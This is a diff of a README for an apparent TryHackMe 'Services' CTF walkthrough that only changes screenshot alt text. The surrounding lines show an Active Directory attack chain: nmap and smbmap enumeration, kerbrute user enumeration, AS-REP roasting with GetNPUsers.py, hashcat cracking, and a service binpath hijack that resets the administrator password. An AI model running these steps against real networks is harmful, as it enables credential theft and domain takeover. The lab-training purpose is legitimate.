@@ -1,5 +1,5 @@
 
-![Screenshot from 2023-07-24 12-07-44](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/60b869f4-3ea0-4594-98c5-06636e1e0b8d)
+![banner](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/60b869f4-3ea0-4594-98c5-06636e1e0b8d)
 
 # Services-THM-Walkthrough
 
@@ -24,7 +24,7 @@ sudo nmap -v --min-rate 10000 <Target's IP address> -p- | grep open
 We can use standard expressionw to efficiently sort nmap results and grab all of the open ports for a script scan.
 
 `cat tmp | sed 's/\// /g' | awk '{print $1}' | tr "\n" ","`
-![Screenshot from 2023-07-24 11-49-23](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/6ad9c92d-8bd2-44a0-9e5a-fc7beea1f90b)
+![1](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/6ad9c92d-8bd2-44a0-9e5a-fc7beea1f90b)
 
 We'll follow up now with a full scan:
 `sudo nmap -v -sVC -oN nmap.txt <Target's IP address> -p <ports>`
@@ -36,13 +36,13 @@ smbmap -u 'anonymous' -H $IP
 ENUMERATION:
 walk the port 80 website. We quickly identify some employee names from the employees listed on the site.
 
-![Screenshot from 2023-07-24 12-03-22](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/6d7f921d-534f-4d0a-a579-cb570525e633)
+![2](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/6d7f921d-534f-4d0a-a579-cb570525e633)
 
 And here is a naming convention, revealed by the contact email:
-![Screenshot from 2023-07-24 12-05-09](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/994b794b-6a50-47e1-b3bf-d04ac846b860)
+![3](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/994b794b-6a50-47e1-b3bf-d04ac846b860)
 
 Using the naming convention from the contact email, we can compile a shortlist now of possible usernames.
-![Screenshot from 2023-07-24 12-12-54](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/d6fd88fd-be54-4efa-b96a-006dc9a1f653)
+![4](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/d6fd88fd-be54-4efa-b96a-006dc9a1f653)
 
 Next, we'll move on to active directory username enumeration.
 ## **KERBRUTE**
@@ -50,12 +50,12 @@ Next, we'll move on to active directory username enumeration.
 `kerbrute userenum --dc $IP -d services.local users.txt`
 
 We found some valid users!
-![Screenshot from 2023-07-24 12-20-23](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/8b76634d-69bc-4aba-a1e9-8ac9310376e6)
+![5](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/8b76634d-69bc-4aba-a1e9-8ac9310376e6)
 
 AS-REP ROASTING WITH GetNPUsers.py:
 `GetNPUsers.py -dc-ip $IP -request 'services.local/' -usersfile users.txt -format hashcat`
 
-![Screenshot from 2023-07-24 12-22-08](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/7632cdf0-fc94-4e3c-a083-f3a2d592afde)
+![6](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/7632cdf0-fc94-4e3c-a083-f3a2d592afde)
 Boom Shack-a-lacka! j.rock hash is revealed!
 
 ## **CRACKING THE HASH WITH HASHCAT**
@@ -76,7 +76,7 @@ We see that j.rock is in the
 Next, let's check services:
 
 `services`
-![Screenshot from 2023-07-24 12-26-09](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/7f82a997-9476-47a3-af3a-910d4bf1479d)
+![7](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/7f82a997-9476-47a3-af3a-910d4bf1479d)
 
 
 Our privesc path forward will be binpath hijacking with the ADWS service. 
@@ -93,9 +93,9 @@ CHANGE THE ADMIN PASSWORD
 net user administrator hellothisisatest123!
 
 log out and back in with admin 
-![Screenshot from 2023-07-24 12-41-24](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/52b256ff-1582-4ca6-bb24-61959a69ebc9)
+![8](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/52b256ff-1582-4ca6-bb24-61959a69ebc9)
 
 grab the root flag!
-![Screenshot from 2023-07-24 12-42-11](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/8577bce9-6fcf-4975-83b8-dce228acc582)
+![9](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/8577bce9-6fcf-4975-83b8-dce228acc582)
 
 
